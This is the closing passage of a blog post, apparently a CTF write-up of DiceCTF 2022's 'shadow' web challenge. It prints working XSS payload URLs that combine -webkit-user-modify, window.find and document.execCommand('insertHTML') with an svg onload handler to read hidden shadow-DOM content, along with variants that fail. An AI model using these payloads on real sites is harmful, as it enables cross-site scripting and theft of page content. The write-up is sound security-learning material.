<p>When doing this question, I thought that maybe using <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/Guide/Houdini">Houdini</a> and implementing some custom CSS properties or layout rules could get the DOM, but because of CSP and execution order, it should not be possible.</p>
<p>Later, because no one solved this question for a long time, the organizers released a hint: “Hint 1: non-standard css properties might help you.”</p>
<p>After seeing this, I went to Google: <code>non-standard css properties</code>, and found this: <a target="_blank" rel="noopener" href="https://gist.github.com/ryboe/bb95223148e486acbe7a">Non-standard and Obsolete CSS Properties</a>, and actually tried several properties in it, but they were not helpful.</p>
<p>At this point, I suddenly became curious about which CSS properties Chrome actually supports, so I went directly to the source code to see it and found this: <a target="_blank" rel="noopener" href="https://chromium.googlesource.com/chromium/blink/+/refs/heads/main/Source/core/css/CSSProperties.in">https://chromium.googlesource.com/chromium/blink/+/refs/heads/main/Source/core/css/CSSProperties.in</a></p>
<p>I looked through the CSS properties one by one, and found <code>-webkit-user-modify</code>, which led me to MDN: <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/CSS/user-modify">https://developer.mozilla.org/en-US/docs/Web/CSS/user-modify</a></p>
<p>It looks like this property is similar to <code>contenteditable</code>. Since it has become <code>contenteditable</code>, I naturally thought of <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-TW/docs/Web/API/Document/execCommand">document.execCommand</a>, which has an <code>insertHTML</code> command that looks promising.</p>
<p>So I tried various things on the console, such as <code>document.execCommand(&#39;insertHTML&#39;,false,&#39;&lt;img src=x onerror=console.log(this.parentNode)&#39;)</code>, but the console displayed <code>null</code>. I thought it might not be the right solution, so I gave up.</p>
<p>After reading the writeup: <a target="_blank" rel="noopener" href="https://github.com/Super-Guesser/ctf/blob/master/2022/dicectf/shadow.md">https://github.com/Super-Guesser/ctf/blob/master/2022/dicectf/shadow.md</a>, I found that my direction was completely correct, but there were two key points that I missed.</p>
<p>The first key point is to focus on the text first before executing insertHTML. I had tried <code>.focus()</code> before, but it didn’t work. The second key point is to use svg to succeed.</p>
<p>Here is the successful payload:</p>
<pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;aszx87410.github.io&#x2F;demo&#x2F;misc&#x2F;shadow.html?y&#x3D;-webkit-user-modify:+read-write&amp;x&#x3D;&lt;img+src&#x3D;x+onerror&#x3D;&quot;find(&#39;steal me&#39;);document.execCommand(&#39;insertHTML&#39;,false,&#39;&lt;svg&#x2F;onload&#x3D;alert(this.parentNode.innerHTML)&gt;&#39;)&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>First, use <code>window.find</code> to focus on the content, then execute <code>document.execCommand</code> to insert HTML, and then use the <code>svg</code> event to execute JS to get the node.</p>
<p>Here are some payloads that will fail:</p>
<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; 沒有 focus
https:&#x2F;&#x2F;aszx87410.github.io&#x2F;demo&#x2F;misc&#x2F;shadow.html?y&#x3D;-webkit-user-modify:+read-write&amp;x&#x3D;&lt;img+src&#x3D;x+onerror&#x3D;&quot;document.execCommand(&#39;insertHTML&#39;,false,&#39;&lt;svg&#x2F;onload&#x3D;alert(this.parentNode.innerHTML)&gt;&#39;)&quot;&gt;

&#x2F;&#x2F; 用了不是 svg 的元素，會讀不到 this.parentNode
https:&#x2F;&#x2F;aszx87410.github.io&#x2F;demo&#x2F;misc&#x2F;shadow.html?y&#x3D;-webkit-user-modify:+read-write&amp;x&#x3D;&lt;img+src&#x3D;x+onerror&#x3D;&quot;find(&#39;steal me&#39;);document.execCommand(&#39;insertHTML&#39;,false,&#39;&lt;img&#x2F;src&#x3D;x+onerror&#x3D;alert(this.parentNode.innerHTML)&gt;&#39;)&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>But the magical thing is that if you first add <code>document.exec(&#39;selectAll&#39;)</code> at the beginning, it works:</p>
<pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;aszx87410.github.io&#x2F;demo&#x2F;misc&#x2F;shadow.html?y&#x3D;-webkit-user-modify:+read-write&amp;x&#x3D;&lt;img+src&#x3D;x+onerror&#x3D;&quot;find(&#39;steal me&#39;);document.execCommand(&#39;selectAll&#39;);document.execCommand(&#39;insertHTML&#39;,false,&#39;&lt;img&#x2F;src&#x3D;x+onerror&#x3D;alert(this.parentNode.parentNode.innerHTML)&gt;&#39;)&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>Why is there this difference? I don’t know, and the people who solved it don’t seem to know either XD</p>
<p>In addition to learning about the magical API <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/API/Window/find">window.find</a>, I also learned about another hidden API from the post-event discussion on Discord: <code>document.execCommand(&#39;findString&#39;, false, &#39;steal&#39;)</code>, which they said they saw in the Chromium source code: <a target="_blank" rel="noopener" href="https://chromium.googlesource.com/chromium/src/+/refs/tags/100.0.4875.3/third_party/blink/renderer/core/editing/commands/editor_command_names.h#35">https://chromium.googlesource.com/chromium/src/+/refs/tags/100.0.4875.3/third_party/blink/renderer/core/editing/commands/editor_command_names.h#35</a></p>
<p>Here are three things to look into in the future:</p>
<ol>
<li>Study all the commands that <code>document.execCommand</code> can execute.</li>
<li>Study all global functions.</li>
<li>Study all CSS properties supported by Chrome.</li>
</ol>
<h2><span id="conclusion">Conclusion</span></h2><p>Although I only solved 1 web question out of 10, I still gained a lot. Here are some new things I learned:</p>
<ol>
<li>Node.js wraps modules in functions.</li>
<li>You can’t use <code>import &quot;fs&quot;</code>, but you can use <code>import(&quot;fs&quot;).then()</code>.</li>
<li>Some characters in JS change length after being converted to uppercase or lowercase.</li>
<li><code>RegExp.input</code>, also known as <code>RegExp.$_</code>, can be used to get the last input that was compared.</li>
<li><code>&lt;svg&gt;&lt;svg onload=alert()&gt;</code> is executed synchronously, which is really amazing.</li>
<li>You can fill the connection pool to execute a timing attack.</li>
<li><code>-webkit-user-modify</code> can do similar things to <code>contenteditable</code>.</li>
<li><code>window.find</code> and <code>document.execCommand(&#39;findString&#39;, false, &#39;steal&#39;)</code> can highlight the corresponding string.</li>
</ol>
<p>“I feel that the techniques I learned this time will also be very useful in other CTF competitions.”</p>

    
    </div>
    
    <div class="columns is-variable is-1 is-multiline is-mobile">
    
        <span class="column is-narrow"><a class="tag is-light article-tag" href="/en/tags/Front-end/">#Front-end</a></span>
    
        <span class="column is-narrow"><a class="tag is-light article-tag" href="/en/tags/JavaScript/">#JavaScript</a></span>
    
        <span class="column is-narrow"><a class="tag is-light article-tag" href="/en/tags/Security/">#Security</a></span>
    
    </div>
    
    
    <div class="columns is-mobile is-multiline article-nav">
        <span class="column is-12-mobile is-half-desktop  article-nav-prev">
            
            <a href="/2022/02/09/en/javascript-runtime/">Understanding the Execution Environment (Runtime) in JavaScript</a>
            
        </span>
        <span class="column is-12-mobile is-half-desktop  article-nav-next">
            
            <a href="/2022/02/08/en/how-i-hacked-glints-and-your-resume-en/">Story of critical security flaws I found in Glints</a>
            
        </span>
    </div>
    
</article>




<div class="comments">
    <h3 class="title is-4">Comments</h3>
    <script src="https://utteranc.es/client.js"
        repo="aszx87410/huli-blog"
        issue-term="title"
        theme="github-light"
        crossorigin="anonymous"
        async>
</script>
</div>

    </div>
</section>
    <footer class="footer">
    <div class="container">
        <div class="columns content">
            <div class="column is-narrow has-text-centered">
                &copy; 2025 Huli&nbsp;
                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a
                        target="_blank" rel="noopener" href="http://github.com/ppoffice/hexo-theme-minos">Minos</a>
            </div>
            <div class="column is-hidden-mobile"></div>

            
            <div class="column is-narrow">
                <div class="columns is-mobile is-multiline is-centered">
                
                    
                <a class="column is-narrow" title="GitHub" target="_blank" rel="noopener" href="https://github.com/ppoffice/hexo-theme-minos">
                    
                    GitHub
                    
                </a>
                
                </div>
            </div>
            
            
<div class="column is-narrow has-text-centered">
    <div class="dropdown is-up is-right is-hoverable" style="margin-top: -0.2em;">
        <div class="dropdown-trigger">
            <button class="button is-small" aria-haspopup="true">
                <span class="icon">
                    <i class="fas fa-globe"></i>
                </span>
                <span>English</span>
                <span class="icon is-small">
            <i class="fas fa-angle-down" aria-hidden="true"></i>
          </span>
            </button>
        </div>
        <div class="dropdown-menu has-text-left" role="menu" style="top:100%">
            <div class="dropdown-content">
            <!-- NOTE: 永遠回到首頁 -->
            
                <a href="/2022/02/08/what-i-learned-from-dicectf-2022/" class="dropdown-item">
                    繁體中文
                </a>
            
            </div>
        </div>
    </div>
</div>

        </div>
    </div>
</footer>
    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>



    
    
    
    
    
    
<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
<script>
    (function ($) {
        $(document).ready(function () {
            if (typeof($.fn.lightGallery) === 'function') {
                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
            }
        });
    })(jQuery);
</script>

    
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
    <style>
        .hljs {
            position: relative;
        }

        .hljs .clipboard-btn {
            float: right;
            color: #9a9a9a;
            background: none;
            border: none;
            cursor: pointer;
        }

        .hljs .clipboard-btn:hover {
          color: #8a8a8a;
        }

        .hljs > .clipboard-btn {
            display: none;
            position: absolute;
            right: 4px;
            top: 4px;
        }

        .hljs:hover > .clipboard-btn {
            display: inline;
        }

        .hljs > figcaption > .clipboard-btn {
            margin-right: 4px;
        }
    </style>
    <script>
      $(document).ready(function () {
        $('figure.hljs').each(function(i, figure) {
          var codeId = 'code-' + i;
          var code = figure.querySelector('.code');
          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
          code.id = codeId;
          copyButton.addClass('clipboard-btn');
          copyButton.attr('data-clipboard-target-id', codeId);

          var figcaption = figure.querySelector('figcaption');

          if (figcaption) {
            figcaption.append(copyButton[0]);
          } else {
            figure.prepend(copyButton[0]);
          }
        })

        var clipboard = new ClipboardJS('.clipboard-btn', {
          target: function(trigger) {
            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
          }
        });
        clipboard.on('success', function(e) {
          e.clearSelection();
        })
      })
    </script>

    
    

    



<script src="/js/script.js?v=3.js"></script>


    
</body>
</html>